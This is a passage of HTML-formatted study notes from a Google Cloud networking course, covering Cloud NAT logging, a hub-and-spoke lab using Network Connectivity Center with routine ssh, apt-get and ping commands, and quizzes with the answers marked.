CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> The Cloud NAT gateway implements outbound NAT, but not inbound NAT. In other words, hosts outside of your VPC network can only respond to connections initiated by your instances; they cannot initiate their own, new connections to your instances via NAT.</span></p><h4 id='task-4-configure-and-view-logs-with-cloud-nat-logging'><span>Task 4. Configure and view logs with Cloud NAT Logging</span></h4><p><span>Cloud NAT logging](</span><a href='https://cloud.google.com/nat/docs/monitoring' target='_blank' class='url'>https://cloud.google.com/nat/docs/monitoring</a><span>) allows you to log NAT connections and errors. When Cloud NAT logging is enabled, one log entry can be generated for each of the following scenarios:</span></p><ul><li><p><span>When a network connection using NAT is created.</span></p></li><li><p><span>When a packet is dropped because no port was available for NAT.</span></p></li></ul><p><span>You can opt to log both kinds of events, or just one or the other. Created logs are sent to Cloud Logging.</span></p><p><span>Enabling logging</span></p><p><span>If logging is enabled, all collected logs are sent to Cloud Logging by default. You can filter these so that only certain logs are sent.</span></p><p><span>You can also specify these values when you create a NAT gateway or by editing one after it has been created. The following directions show how to enable logging for an existing NAT gateway.</span></p><p>&nbsp;</p><ol start='' ><li><p><span>In the Google Cloud Console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>Network services</span></strong><span> &gt; </span><strong><span>Cloud NAT</span></strong><span>.</span></p></li><li><p><span>Click on the </span><code>nat-config</code><span> gateway and then click </span><strong><span>Edit</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Advanced configurations</span></strong><span> dropdown to open that section.</span></p></li><li><p><span>For </span><strong><span>Logging</span></strong><span>, select </span><strong><span>Translation and errors</span></strong><span> and then click </span><strong><span>Save</span></strong><span>.</span></p></li></ol><p>&nbsp;</p><p><span>NAT logging in Cloud Logging</span></p><p><span>Now that you have set up Cloud NAT logging for the </span><code>nat-config</code><span> gateway, let&#39;s find out where we can view our logs.</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Click on </span><code>nat-config</code><span> to expose its details. Then click on the </span><strong><span>View in Logs Explorer</span></strong><span>.</span></p></li><li><p><span>This will open a new tab with </span><strong><span>Logs Explorer</span></strong><span>.</span></p></li></ol><p><span>You will see that there aren&#39;t any logs yet—that&#39;s because we just enabled this feature for the gateway.</span></p><p><strong><span>Note:</span></strong><span> Keep this tab open and return to your other Google Cloud Console tab.</span></p><p>&nbsp;</p><p><span>Generating logs</span></p><p><span>As a reminder, Cloud NAT logs are generated for the following sequences:</span></p><ul><li><p><span>When a network connection using NAT is created.</span></p></li><li><p><span>When a packet is dropped because no port was available for NAT.</span></p></li></ul><p><span>Let&#39;s connect the host to the internal VM again to see if any logs are generated.</span></p><p>&nbsp;</p><ol start='' ><li><p><span>In </span><strong><span>Cloud Shell</span></strong><span> for </span><strong><span>vm-internal</span></strong><span>, to try to re-synchronize the package index of </span><strong><span>vm-internal</span></strong><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> gcloud compute ssh vm-internal --zone ZONE --tunnel-through-iap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='2' ><li><p><span>If prompted, type </span><strong><span>Y</span></strong><span> to continue.</span></p></li><li><p><span>Try to re-synchronize the package index of </span><strong><span>vm-internal</span></strong><span> by running the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> sudo apt-get update</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>The output should look like this (</span><strong><span>example output</span></strong><span>):</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ...</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Reading package lists... Done</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><ol start='4' ><li><p><span>To return to your Cloud Shell instance, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Let&#39;s see if opening up this connection revealed anything new in our logs.</span></p><p>&nbsp;</p><p><span>Viewing Logs</span></p><p>&nbsp;</p><ul><li><p><span>Return to your Logs Explorer tab, and in the navigation menu, click </span><strong><span>Logs Explorer</span></strong><span>.</span></p></li></ul><p><span>You should see two new logs that were generated after connecting to the internal VM.</span></p><p><strong><span>Note:</span></strong><span> You may need to wait for a few minutes. If you are still unable to see the logs, repeat step 1 to step 4, from the </span><strong><span>Generating logs</span></strong><span> section, and then refresh the logging page. </span></p><p><span>As we see, the logs give us details on the VPC network we connected to and the connection method we used. Feel free to expand different labels and details.</span></p><p>&nbsp;</p><p><span>Task 5. Review</span></p><p><span>You created </span><strong><span>vm-internal</span></strong><span>, an instance with no external IP address, and connected to it securely using an IAP tunnel. Then you enabled Private Google Access, configured a NAT gateway, and verified that </span><strong><span>vm-internal</span></strong><span> can access Google APIs and services and other public IP addresses.</span></p><p><span>VM instances without external IP addresses are isolated from external networks. Using Cloud NAT, these instances can access the internet for updates and patches, and in some cases, for bootstrapping. As a managed service, Cloud NAT provides high availability without user management and intervention.</span></p><p><span>IAP uses your existing project roles and permissions when you connect to VM instances. By default, instance owners are the only users that have the </span><strong><span>IAP Secured Tunnel User</span></strong><span>role.</span></p><p><span>For how to allow other users to access your VMs using IAP tunneling, see, in the Cloud Architecture Center, </span><a href='https://cloud.google.com/solutions/building-internet-connectivity-for-private-vms#grant_access_to_additional_users'><span>Grant access to additional users Guide</span></a><span>.</span></p><p>&nbsp;</p><p><span>End your lab</span></p><p><span>When you have completed your lab, click </span><strong><span>End Lab</span></strong><span>. Google Cloud Skills Boost removes the resources you’ve used and cleans the account for you.</span></p><h3 id='quiz-5'><span>Quiz</span></h3><ol start='' ><li><p><span>You want to provide access to services that you created in a VPC network. The services should be available to other specified VPC networks through endpoints that have internal IP addresses. Some of these VPC networks have subnets with overlapping internal IP addresses. Which product can you use?</span></p></li></ol><ul><li><p><span>Private services access</span></p></li><li><p><span>Private Google Access</span></p></li><li><p><strong><span>Private Service Connect</span></strong></p></li><li><p><span>Cloud NAT</span></p></li></ul><ol start='2' ><li><p><span>To enable Private Google Access for a VPC network:</span></p></li></ol><ul><li><p><span>Enable it on the VPC network.</span></p></li><li><p><span>Enable it on the VPC network, on the desired subnets, and on Cloud Router.</span></p></li><li><p><span>Enable it on all desired subnets and on Cloud Router.</span></p></li><li><p><strong><span>Enable it on all desired subnets in the VPC network.</span></strong></p></li></ul><ol start='3' ><li><p><span>Private services access automatically configures which Google Cloud product to implement communication between the producer and consumer VPC networks?</span></p></li></ol><ul><li><p><strong><span>VPC Network Peering</span></strong></p></li><li><p><span>Cloud NAT</span></p></li><li><p><span>Private Google Access</span></p></li><li><p><span>Shared VPC</span></p></li></ul><p><span>## </span></p><h1 id='05-networking-in-google-cloud-network-architecture'><span>05 Networking in Google Cloud: Network Architecture</span></h1><h2 id='introduction-to-network-architecture'><span>Introduction to Network Architecture</span></h2><h3 id='quiz-6'><span>Quiz</span></h3><ol start='' ><li><p><span>You are designing a new network infrastructure in Google Cloud to support a global e-commerce application. Which two of the following are key considerations you should prioritize in your network design?</span></p></li></ol><ul><li><p><span>To justify the need for a new network.</span></p></li><li><p><span>To create a detailed project timeline.</span></p></li><li><p><strong><span>To inform and guide design choices, ensuring the network aligns with organizational goals and constraints.</span></strong></p></li><li><p><strong><span>To ensure high availability and disaster recovery capabilities for the network.</span></strong></p></li></ul><ol start='2' ><li><p><span>Which of the following practices is LEAST likely to improve network security in Google Cloud?</span></p></li></ol><ul><li><p><span>Regularly reviewing and updating IAM (Identity and Access Management) permissions.</span></p></li><li><p><span>Enabling VPC flow logs to monitor network traffic.</span></p></li><li><p><span>Implementing network firewall rules to control traffic.</span></p></li><li><p><strong><span>Assigning public IP addresses to all virtual machines in a VPC.</span></strong></p></li></ul><p>&nbsp;</p><h2 id='network-topologies'><span>Network Topologies</span></h2><h3 id='lab---implementing-a-hub-and-spoke-using-ncc'><span>LAB - Implementing a Hub and Spoke using NCC</span></h3><h4 id='overview-2'><span>Overview</span></h4><p><span>In this lab, you design and implement a classic hub-and-spoke network topology. Your pre-configured environment includes three VPC networks—a central hub and two branches (spoke1 and spoke2). You will create virtual machines (VMs) on each network to test connectivity.</span></p><p><span>You begin by verifying connectivity between the VMs within and across VPCs. Then, you use NCC to implement a hub and spoke. You retest connectivity to confirm that your hub-and-spoke architecture is fully functional.</span></p><h4 id='objectives'><span>Objectives</span></h4><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Configure VMs in different VPCs.</span></p></li><li><p><span>Test connectivity between networks before implementing a hub and spoke.</span></p></li><li><p><span>Use NCC to create a hub and spoke.</span></p></li><li><p><span>Test connectivity after implementing a hub and spoke.</span></p></li><li><p><span>Use Network Topology to view metrics for traffic between entities.</span></p></li></ul><h4 id='setup-and-requirements-2'><span>Setup and requirements</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h4 id='task-1-explore-the-pre-configured-network'><span>Task 1. Explore the pre-configured network</span></h4><p><span>The network </span><strong><span>hub-vpc</span></strong><span> with </span><strong><span>hub-subnet</span></strong><span>, </span><strong><span>spoke1-vpc</span></strong><span> with </span><strong><span>spoke1-subnet</span></strong><span>, and </span><strong><span>spoke2-vpc</span></strong><span> with </span><strong><span>spoke2-subnet</span></strong><span> along with firewall rules for </span><strong><span>RDP</span></strong><span>, </span><strong><span>SSH</span></strong><span>, and </span><strong><span>ICMP</span></strong><span>traffic have been configured for you.</span></p><ul><li><p><span>In the Google Cloud console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>VPC network &gt; VPC networks</span></strong><span>.</span>
<span>Notice the </span><strong><span>hub-vpc</span></strong><span>, </span><strong><span>spoke1-vpc</span></strong><span>, and </span><strong><span>spoke2-vpc</span></strong><span> network with its subnets: </span><strong><span>hub-subnet</span></strong><span>, </span><strong><span>spoke1-subnet</span></strong><span>, and </span><strong><span>spoke2-subnet</span></strong><span>.</span></p><p><span>Each Google Cloud project starts with the </span><strong><span>default</span></strong><span> network. In addition, the </span><strong><span>hub-vpc</span></strong><span>, </span><strong><span>spoke1-vpc</span></strong><span>, and </span><strong><span>spoke2-vpc</span></strong><span> network has been created for you as part of your network diagram.</span></p><p><span>You create a VM in </span><strong><span>hub-subnet</span></strong><span>, </span><strong><span>spoke1-subnet</span></strong><span>, and </span><strong><span>spoke2-subnet</span></strong><span>.</span></p></li></ul><h4 id='explore-the-firewall-rules'><span>Explore the firewall rules</span></h4><ol start='' ><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>VPC network &gt; Firewall</span></strong><span>.</span>
<span>Notice the </span><strong><span>app-allow-icmp</span></strong><span> and </span><strong><span>app-allow-ssh-rdp</span></strong><span> firewall rules.</span></p><p><span>These firewall rules have been created for you.</span></p></li></ol><h4 id='task-2-create-a-vm-in-each-vpc'><span>Task 2. Create a VM in each VPC</span></h4><ol start='' ><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Instance</span></strong><span>.</span></p></li><li><p><span>Specify </span><strong><span>Name</span></strong><span> as </span><strong><span>hub-vm</span></strong><span>.</span></p></li><li><p><span>In the left frame, click </span><strong><span>Networking</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Network interfaces</span></strong><span> , click </span><strong><span>default</span></strong><span>. From the </span><strong><span>Network</span></strong><span> dropdown select </span><strong><span>hub-vpc</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Repeat the process to create a </span><strong><span>spoke1-vm</span></strong><span> VM in </span><code>spoke1-vpc</code><span> and a </span><strong><span>spoke2-vm</span></strong><span> VM in </span><code>spoke2-vpc</code><span>.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create a VM in each VPC</span></p><p>&nbsp;</p><h4 id='task-3-test-connectivity'><span>Task 3: Test connectivity</span></h4><p><span>spoke1-vm and spoke2-vm are in two different VPCs. Let us test the connectivity between the two.</span></p><ol start='' ><li><p><span>On the </span><strong><span>VM instances</span></strong><span> page, for </span><strong><span>spoke1-vm</span></strong><span>, copy the internal IP address.</span></p></li><li><p><span>On the </span><strong><span>VM instances</span></strong><span> page, for </span><strong><span>spoke2-vm</span></strong><span>, click </span><strong><span>SSH</span></strong><span>.</span></p></li><li><p><span>Run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping &lt;internal IP address of spoke1-vm&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>Notice how the ping fails. This should execute and display 100% packet loss. Press </span><strong><span>Ctrl+C</span></strong><span> to stop the command.</span></p><ol start='' ><li><p><span>Now, SSH into </span><strong><span>spoke1-vm</span></strong><span> to test the connectivity from </span><strong><span>spoke1-vm</span></strong><span> to </span><strong><span>spoke2-vm</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping &lt;internal IP address of spoke2-vm&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>Notice how the ping fails. This should execute and display 100% packet loss. Press </span><strong><span>Ctrl+C</span></strong><span> to stop the command.</span></p><h4 id='task-4-create-a-hub-and-spoke-using-ncc'><span>Task 4: Create a hub and spoke using NCC</span></h4><p><span>Network Connectivity Center lets you create VPC spokes to connect VPC networks together for full mesh connectivity.</span></p><ol start='' ><li><p><span>On the Google Cloud console title bar, type </span><strong><span>Network Connectivity Center</span></strong><span> in the Search field, then click </span><strong><span>Network Connectivity Center</span></strong><span> in the </span><strong><span>Products &amp; Page</span></strong><span>section.</span></p></li><li><p><span>Click </span><strong><span>Create hub</span></strong><span>.</span></p></li><li><p><span>Enter </span><strong><span>my-hub</span></strong><span> for </span><strong><span>Hub Name</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Next step</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add a spoke</span></strong><span>.</span></p></li><li><p><span>Enter </span><strong><span>spoke1</span></strong><span> for first </span><strong><span>Spoke Name</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>VPC network</span></strong><span> as the Spoke type.</span></p></li><li><p><span>To add a VPC network to the spoke, select </span><strong><span>spoke1-vpc</span></strong><span>.</span></p></li><li><p><span>Click Done.</span></p></li><li><p><span>Click </span><strong><span>Add a spoke</span></strong><span> to add a second spoke,</span></p></li><li><p><span>Enter </span><strong><span>spoke2</span></strong><span> for second </span><strong><span>Spoke Name</span></strong><span>.</span></p></li><li><p><span>Select VPC network as the Spoke type.</span></p></li><li><p><span>Choose </span><strong><span>spoke2-vpc</span></strong><span> as the VPC network for this spoke.</span></p></li><li><p><span>Click Done.</span></p></li><li><p><span>When you have finished adding spokes, click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create a hub and spoke using NCC</span></p><p>&nbsp;</p><h4 id='task-5-retest-connectivity'><span>Task 5. Retest connectivity</span></h4><p><span>VPC spokes reduce the operational complexity of managing the individual pair-wise VPC Network Peering connections through the use of VPC spokes and a centralized connectivity management model. Now you retest the connectivity between the VMs from spokes.</span></p><p><span>This task has been performed for you at the start of this lab. You will need to SSH into VM and run the following command to setup the environment.</span></p><ol start='' ><li><p><span>On the </span><strong><span>Navigation</span></strong><span> menu, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span>.</span></p></li><li><p><span>Select the SSH button next to </span><strong><span>spoke1-vm</span></strong><span> to SSH into the VM.</span></p></li><li><p><span>If prompted &quot;Allow SSH-in-browser to connect to VMs,&quot; click </span><strong><span>Authorize</span></strong><span>.</span></p></li><li><p><span>Run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 3 &lt;internal IP address of spoke2-vm&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Repeat the previous steps for </span><strong><span>spoke2-vm</span></strong><span>.</span></p></li></ol><h4 id='task-6-explore-the-network-topology-tool'><span>Task 6. Explore the Network Topology Tool</span></h4><p><span>Network Topology is a visualization tool that shows the topology of your network infrastructure. You can also view metrics and details of network traffic to other Shared VPC networks and inter-region traffic.</span></p><p><span>For each Network Topology hierarchy, the Google Cloud console displays a single metric for Compute Engine virtual machine (VM) instance entities and region entities, as well as for connections.</span></p><ol start='' ><li><p><span>In the Google Cloud console, go to the Network Topology page.</span></p></li><li><p><span>Hover over an entity to display the </span><strong><span>Expand</span></strong><span> icon for expanding or </span><strong><span>Collapse</span></strong><span> icon for collapsing.</span></p></li><li><p><span>In the Metrics and insights section, select an insight from the options.</span></p></li></ol><h4 id='congratulations-2'><span>Congratulations!</span></h4><p><span>In this lab, you implemented a classic hub-and-spoke network topology. You created virtual machines (VMs) on each network to test connectivity.</span></p><p><span>You started by verifying connectivity between the VMs within and across VPCs. Then, you used NCC to implement a hub and spoke. You retested connectivity to confirm that the hub-and-spoke architecture was fully functional.</span></p><p>&nbsp;</p><h3 id='quiz-7'><span>Quiz</span></h3><ol start='' ><li><p><span>You are designing a Google Cloud network for a large financial services company with strict security requirements. The network needs to isolate sensitive customer data from other resources and limit communication between specific network segments. Which of the following network topologies would be most suitable for this scenario?</span></p></li></ol><ul><li><p><span>Hub-and-spoke</span></p></li><li><p><span>Mesh</span></p></li><li><p><span>Mirrored</span></p></li><li><p><strong><span>Gated ingress and egress</span></strong></p></li></ul><p><span>Correct! This topology allows granular control over incoming and  outgoing traffic, enabling isolation of sensitive data and restriction  of unauthorized communication 